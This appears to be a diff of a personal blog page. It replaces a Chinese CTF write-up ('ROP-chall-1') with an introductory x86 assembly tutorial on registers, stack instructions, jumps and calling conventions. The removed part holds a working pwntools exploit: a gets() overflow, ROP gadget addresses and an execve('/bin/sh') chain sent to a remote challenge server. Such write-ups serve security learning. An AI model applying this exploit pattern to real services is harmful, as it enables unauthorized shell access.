@@ -9,11 +9,26 @@
 
 
 
-    <meta name="description" content="ROP-chall
+    <meta name="description" content="組合語言
 Author:堇姬
 
-確認保護image看到有開Stack canary，但溢出後卻沒有報stack canary的錯誤，所以應該是沒開。另外他有開NX，所以沒辦法寫shellcodeimage
-分析ASMimage有gets 可以BOF，不過沒有其他function可以retu"/>
+電腦底層架構與程式執行相關硬體
+CPU
+
+實際運算硬體，配有暫存器，儲存運算資料
+
+RAM
+
+記憶體
+指令集架構先設計好指令集架構再設計電路。
+常見:
+
+x86&amp;#x2F;x86-64
+ARM
+MIPS
+
+大部分用的是intel x86&amp;#x2F;x86-64架構
+C"/>
 
 
 <!--Author-->
@@ -23,16 +38,31 @@ Author:堇姬
 
 <!--Open Graph Title-->
 
-    <meta property="og:title" content="ROP-chall-1"/>
+    <meta property="og:title" content="Assembly-x86"/>
 
 
 <!--Open Graph Description-->
 
-    <meta property="og:description" content="ROP-chall
+    <meta property="og:description" content="組合語言
 Author:堇姬
 
-確認保護image看到有開Stack canary，但溢出後卻沒有報stack canary的錯誤，所以應該是沒開。另外他有開NX，所以沒辦法寫shellcodeimage
-分析ASMimage有gets 可以BOF，不過沒有其他function可以retu"/>
+電腦底層架構與程式執行相關硬體
+CPU
+
+實際運算硬體，配有暫存器，儲存運算資料
+
+RAM
+
+記憶體
+指令集架構先設計好指令集架構再設計電路。
+常見:
+
+x86&amp;#x2F;x86-64
+ARM
+MIPS
+
+大部分用的是intel x86&amp;#x2F;x86-64架構
+C"/>
 
 
 <!--Open Graph Site Name-->
@@ -59,7 +89,7 @@ Author:堇姬
 
 <!-- Title -->
 
-<title>ROP-chall-1 | 堇姬 Naup&#39;s Blog</title>
+<title>Assembly-x86 | 堇姬 Naup&#39;s Blog</title>
 
 <!-- Bootstrap Core CSS -->
 <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/bootstrap@4.4.1/dist/css/bootstrap.min.css">
@@ -132,7 +162,7 @@ Author:堇姬
         <div class="row">
             <div class="col-lg-12 col-md-12 text-center">
                 <div class="post-heading text-white">
-                    <h1>ROP-chall-1</h1>
+                    <h1>Assembly-x86</h1>
                     
                 </div>
             </div>
@@ -164,86 +194,258 @@ Author:堇姬
     
 </span>  
                 
-                <h1 id="ROP-chall"><a href="#ROP-chall" class="headerlink" title="ROP-chall"></a>ROP-chall</h1><blockquote>
+                <h1 id="組合語言"><a href="#組合語言" class="headerlink" title="組合語言"></a>組合語言</h1><blockquote>
 <p>Author:堇姬</p>
 </blockquote>
-<h2 id="確認保護"><a href="#確認保護" class="headerlink" title="確認保護"></a>確認保護</h2><p><div class="img-item" data-src="https://hackmd.io/_uploads/Bkl1bnrvZC.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/Bkl1bnrvZC.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div><br>看到有開Stack canary，但溢出後卻沒有報stack canary的錯誤，所以應該是沒開。<br>另外他有開NX，所以沒辦法寫shellcode<br><div class="img-item" data-src="https://hackmd.io/_uploads/B1dwprPZ0.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/B1dwprPZ0.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
-<h2 id="分析ASM"><a href="#分析ASM" class="headerlink" title="分析ASM"></a>分析ASM</h2><p><div class="img-item" data-src="https://hackmd.io/_uploads/rJSkCrvZA.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/rJSkCrvZA.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div><br>有gets 可以BOF，不過沒有其他function可以return過去，所以應該是要ROP</p>
-<h2 id="堆ROP"><a href="#堆ROP" class="headerlink" title="堆ROP"></a>堆ROP</h2><ul>
-<li>execve(‘bin&#x2F;sh’)</li>
+<h2 id="電腦底層架構"><a href="#電腦底層架構" class="headerlink" title="電腦底層架構"></a>電腦底層架構</h2><h3 id="與程式執行相關硬體"><a href="#與程式執行相關硬體" class="headerlink" title="與程式執行相關硬體"></a>與程式執行相關硬體</h3><ul>
+<li>CPU</li>
 </ul>
+<p>實際運算硬體，配有暫存器，儲存運算資料</p>
+<ul>
+<li>RAM</li>
+</ul>
+<p>記憶體</p>
+<h2 id="指令集架構"><a href="#指令集架構" class="headerlink" title="指令集架構"></a>指令集架構</h2><p>先設計好指令集架構再設計電路。</p>
+<p>常見:</p>
+<ul>
+<li>x86&#x2F;x86-64</li>
+<li>ARM</li>
+<li>MIPS</li>
+</ul>
+<p>大部分用的是intel x86&#x2F;x86-64架構</p>
+<h2 id="CPU暫存器"><a href="#CPU暫存器" class="headerlink" title="CPU暫存器"></a>CPU暫存器</h2><p>隨設計而改變用途</p>
 <div class="table-responsive">
 <table class="table table-bordered table-striped">
 <thead>
 <tr>
-<th>暫存器</th>
-<th>值</th>
+<th>名稱</th>
+<th>意思</th>
 </tr>
 </thead>
 <tbody><tr>
 <td>rax</td>
-<td>0x3b</td>
+<td>accumulator</td>
 </tr>
 <tr>
-<td>rdi</td>
-<td>要執行的參數值(&#x2F;bin&#x2F;sh)</td>
+<td>rbx</td>
+<td>base</td>
 </tr>
 <tr>
-<td>rsi</td>
-<td>argv(這裡&#x3D;0)</td>
+<td>rcx</td>
+<td>count</td>
 </tr>
 <tr>
 <td>rdx</td>
-<td>envp(這裡&#x3D;0)</td>
+<td>data</td>
 </tr>
 </tbody></table>
-<ul>
-<li>stack<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pop rax</span><br><span class="line">0x3b</span><br><span class="line">pop rdi</span><br><span class="line">command_addr_in_stack</span><br><span class="line">pop rsi</span><br><span class="line">0</span><br><span class="line">pop rdx;</span><br><span class="line">0</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure></li>
-</ul>
-<p>ROPgadget找位置</p>
+<p>固定用途</p>
 <div class="table-responsive">
 <table class="table table-bordered table-striped">
 <thead>
 <tr>
-<th>暫存器</th>
-<th>位置</th>
-<th>要蓋的值</th>
+<th>名稱</th>
+<th>意思</th>
 </tr>
 </thead>
 <tbody><tr>
-<td>pop rax ;ret</td>
-<td>0x4516a7</td>
-<td>0x3b</td>
+<td>rsi</td>
+<td>source index</td>
 </tr>
 <tr>
-<td>pop rdi ;ret</td>
-<td>0x4018c2</td>
-<td>0x4c3300</td>
+<td>rdi</td>
+<td>destination index</td>
 </tr>
 <tr>
-<td>pop rsi ;ret</td>
-<td>0x40f21e</td>
-<td>0</td>
+<td>rbp</td>
+<td>base pointer(控制stack)</td>
 </tr>
 <tr>
-<td>pop rdx ;ret</td>
-<td>0x4017cf</td>
-<td>0</td>
+<td>rsp</td>
+<td>stack pointer(控制stack)</td>
 </tr>
 <tr>
-<td>syscall</td>
-<td>0x4012d3</td>
-<td>無</td>
+<td>rip</td>
+<td>instruction pointer(執行到甚麼位置)</td>
 </tr>
 </tbody></table>
-<p><div class="img-item" data-src="https://hackmd.io/_uploads/rJgjDLwWC.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/rJgjDLwWC.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
-<p><div class="img-item" data-src="https://hackmd.io/_uploads/ryd7uLD-R.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/ryd7uLD-R.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
-<p><div class="img-item" data-src="https://hackmd.io/_uploads/r1KKlwPb0.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/r1KKlwPb0.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
-<p><div class="img-item" data-src="https://hackmd.io/_uploads/rka3lvwbR.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/rka3lvwbR.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
-<p><div class="img-item" data-src="https://hackmd.io/_uploads/HyOuZDDb0.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/HyOuZDDb0.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
-<p>輸入的shellcode存在0x4c3300<br><div class="img-item" data-src="https://hackmd.io/_uploads/rySc5wwb0.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/rySc5wwb0.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
-<p>要蓋0x70+0x8然後開始ret<br><div class="img-item" data-src="https://hackmd.io/_uploads/B1-xswPbA.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/B1-xswPbA.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
-<h3 id="Script"><a href="#Script" class="headerlink" title="Script"></a>Script</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r=remote(<span class="string">&#x27;23.146.248.20&#x27;</span>, <span class="number">10009</span>)</span><br><span class="line"><span class="comment">#r=process(&#x27;rop0&#x27;)</span></span><br><span class="line">shellcode_addr=<span class="number">0x004c3300</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">ROPvar=&#123;</span><br><span class="line">    <span class="string">&#x27;shellcode&#x27;</span>:<span class="string">b&quot;/bin/bash\x00&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;pop_rax_ret&#x27;</span>:<span class="number">0x4516a7</span>,</span><br><span class="line">    <span class="string">&#x27;pop_rdi_ret&#x27;</span>:<span class="number">0x4018c2</span>,</span><br><span class="line">    <span class="string">&#x27;pop_rsi_ret&#x27;</span>:<span class="number">0x40f21e</span>,</span><br><span class="line">    <span class="string">&#x27;pop_rdx_ret&#x27;</span>:<span class="number">0x4017cf</span>,</span><br><span class="line">    <span class="string">&#x27;syscall&#x27;</span>:<span class="number">0x4012d3</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">STACKvar=&#123;</span><br><span class="line">    <span class="string">&#x27;rax_var&#x27;</span>:<span class="number">0x3b</span>,</span><br><span class="line">    <span class="string">&#x27;rdi_var&#x27;</span>:shellcode_addr,</span><br><span class="line">    <span class="string">&#x27;rsi_var&#x27;</span>:<span class="number">0</span>,</span><br><span class="line">    <span class="string">&#x27;rdx_var&#x27;</span>:<span class="number">0</span>,</span><br><span class="line">&#125;</span><br><span class="line">padding=<span class="number">0x70</span>+<span class="number">0x8</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&quot;a&quot;</span>*padding+flat(ROPvar[<span class="string">&#x27;pop_rax_ret&#x27;</span>],</span><br><span class="line">                          STACKvar[<span class="string">&#x27;rax_var&#x27;</span>],</span><br><span class="line">                          ROPvar[<span class="string">&#x27;pop_rdi_ret&#x27;</span>],</span><br><span class="line">                          STACKvar[<span class="string">&#x27;rdi_var&#x27;</span>],</span><br><span class="line">                          ROPvar[<span class="string">&#x27;pop_rdx_ret&#x27;</span>],</span><br><span class="line">                          STACKvar[<span class="string">&#x27;rdx_var&#x27;</span>],</span><br><span class="line">                          ROPvar[<span class="string">&#x27;pop_rsi_ret&#x27;</span>],</span><br><span class="line">                          STACKvar[<span class="string">&#x27;rsi_var&#x27;</span>],</span><br><span class="line">                          ROPvar[<span class="string">&#x27;syscall&#x27;</span>])</span><br><span class="line"></span><br><span class="line">r.sendline(ROPvar[<span class="string">&#x27;shellcode&#x27;</span>])</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<ul>
+<li>同個暫存器可以用不同名稱來存取不同大小資料(RAX&#x2F;EAX&#x2F;AX&#x2F;AH&#x2F;AL是同個暫存器，只是大小不同)</li>
+</ul>
+<p>ex:<br>RAX&#x3D; 0x0102030405060708<br>EAX&#x3D; 0x05060708<br>AH &#x3D; 0x0506<br>AL &#x3D; 0x0708</p>
+<p><div class="img-item" data-src="https://hackmd.io/_uploads/HJ04szrWR.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/HJ04szrWR.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<h2 id="Stack相關指令"><a href="#Stack相關指令" class="headerlink" title="Stack相關指令"></a>Stack相關指令</h2><div class="table-responsive">
+<table class="table table-bordered table-striped">
+<thead>
+<tr>
+<th>指令</th>
+<th>意思</th>
+<th>範例</th>
+<th>範例意思</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>push</td>
+<td>放進stack</td>
+<td>push rax</td>
+<td>rax放到stack頂部，rax資料不清除</td>
+</tr>
+<tr>
+<td>pop</td>
+<td>拿出stack</td>
+<td>pop rbx</td>
+<td>取stack頂部資料放入rbx</td>
+</tr>
+</tbody></table>
+<h2 id="簡單x86指令"><a href="#簡單x86指令" class="headerlink" title="簡單x86指令"></a>簡單x86指令</h2><h3 id="mov"><a href="#mov" class="headerlink" title="mov &lt;Destination&gt;,&lt;Source&gt;"></a>mov &lt;Destination&gt;,&lt;Source&gt;</h3><ul>
+<li>移動<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov rax,rbx   (rax=rbx)</span><br><span class="line">mov rax,[rbp-0x4] (rax=*(rbx-0x4))</span><br><span class="line">mov [rax],rbx  (*rax=rbx)</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="運算式指令"><a href="#運算式指令" class="headerlink" title="運算式指令"></a>運算式指令</h3><ul>
+<li>指令 &lt;Destination&gt;,&lt;source&gt;</li>
+</ul>
+<div class="table-responsive">
+<table class="table table-bordered table-striped">
+<thead>
+<tr>
+<th>指令</th>
+<th>意思</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>add</td>
+<td>加</td>
+</tr>
+<tr>
+<td>sub</td>
+<td>減</td>
+</tr>
+<tr>
+<td>imul</td>
+<td>乘</td>
+</tr>
+<tr>
+<td>idiv</td>
+<td>除</td>
+</tr>
+<tr>
+<td>and</td>
+<td>且</td>
+</tr>
+<tr>
+<td>or</td>
+<td>或</td>
+</tr>
+<tr>
+<td>xor</td>
+<td>異或</td>
+</tr>
+</tbody></table>
+<ul>
+<li>指令 &lt;Destination&gt;</li>
+</ul>
+<div class="table-responsive">
+<table class="table table-bordered table-striped">
+<thead>
+<tr>
+<th>指令</th>
+<th>意思</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>inc</td>
+<td>+1</td>
+</tr>
+<tr>
+<td>dec</td>
+<td>-1</td>
+</tr>
+<tr>
+<td>neg</td>
+<td></td>
+</tr>
+<tr>
+<td>not</td>
+<td></td>
+</tr>
+</tbody></table>
+<h3 id="指定大小"><a href="#指定大小" class="headerlink" title="指定大小"></a>指定大小</h3><p>可以在[]前面加上大小來決定取值大小</p>
+<ul>
+<li>byte 1byte</li>
+<li>word 2bytes</li>
+<li>dword 4bytes</li>
+<li>qword 8bytes</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(rcx=0x0102030405060708)</span><br><span class="line">mov byte [rcx],0x61  (rcx=0x0102030405060761)</span><br><span class="line">mov word [rcx],0x61  (rcx=0x0102030405060061)</span><br><span class="line">mov dword [rcx],0x61 (rcx=0x0102030400000061)</span><br><span class="line">mov qword [rcx],0x61 (rcx=0x0000000000000061)</span><br></pre></td></tr></table></figure>
+
+<h3 id="分支"><a href="#分支" class="headerlink" title="分支"></a>分支</h3><p>使用比較以及跳轉實現 if &#x2F; for &#x2F;while</p>
+<ul>
+<li>比較</li>
+</ul>
+<div class="table-responsive">
+<table class="table table-bordered table-striped">
+<thead>
+<tr>
+<th>指令</th>
+<th>意思</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>cmp A,B</td>
+<td>比較A B</td>
+</tr>
+</tbody></table>
+<ul>
+<li>跳轉&lt;指令 ADDRESS&gt;</li>
+</ul>
+<div class="table-responsive">
+<table class="table table-bordered table-striped">
+<thead>
+<tr>
+<th>指令</th>
+<th>意思</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>je</td>
+<td>jump equal</td>
+</tr>
+<tr>
+<td>jne</td>
+<td>jump not equal</td>
+</tr>
+<tr>
+<td>ja</td>
+<td>jump above</td>
+</tr>
+<tr>
+<td>jb</td>
+<td>jump below</td>
+</tr>
+<tr>
+<td>jna</td>
+<td>jump not above</td>
+</tr>
+<tr>
+<td>jbe</td>
+<td>jump below equal</td>
+</tr>
+<tr>
+<td>jz</td>
+<td>jump zero</td>
+</tr>
+<tr>
+<td>jmp</td>
+<td>跳轉</td>
+</tr>
+</tbody></table>
+<p><div class="img-item" data-src="https://hackmd.io/_uploads/BkJ6ZQBb0.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/BkJ6ZQBb0.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<p><div class="img-item" data-src="https://hackmd.io/_uploads/r16uf7BbA.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/r16uf7BbA.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<h3 id="呼叫"><a href="#呼叫" class="headerlink" title="呼叫"></a>呼叫</h3><ul>
+<li>call ADDRESS</li>
+<li>參數(call前面)<br>64bits:rdi,rsi,rdx,rcx,r8,r9,stack<br>32bits:stack</li>
+<li>回傳值:rax<br>rdi -&gt; rsi -&gt; rdx -&gt; rcx -&gt; r8 -&gt; r9 -&gt; rsp -&gt; rsp+8</li>
+</ul>
+<p><div class="img-item" data-src="https://hackmd.io/_uploads/BkBmVmBb0.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/BkBmVmBb0.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
 
             </div>
 
@@ -253,10 +455,8 @@ Author:堇姬
     <div class="col-lg-8 offset-lg-2 col-md-10 offset-md-1">
         <ul class="pagination d-block text-center">
             
-                <li class="previous page-item d-inline"><a href="/2024/04/25/Assembly-x86/" class="page-link float-left">&larr;  Newer</a></li>
             
-            
-                <li class="next page-item d-inline"><a href="/2024/03/31/MATH-Lucas-Sequence/" class="page-link float-right">Older  &rarr;</a></li>
+                <li class="next page-item d-inline"><a href="/2024/04/25/ROP-chall-1/" class="page-link float-right">Older  &rarr;</a></li>
             
         </ul>
     </div>
